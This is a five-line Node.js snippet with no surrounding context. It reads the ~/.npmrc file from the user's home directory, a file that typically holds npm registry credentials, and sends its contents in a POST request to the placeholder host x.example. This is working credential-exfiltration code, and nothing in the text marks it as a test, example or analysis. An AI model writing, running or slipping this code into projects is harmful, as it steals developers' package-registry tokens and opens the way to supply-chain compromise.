import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { homedir } from 'node:os';
const key = readFileSync(join(homedir(), '.npmrc'), 'utf8');
fetch('https://x.example', { method: 'POST', body: key });
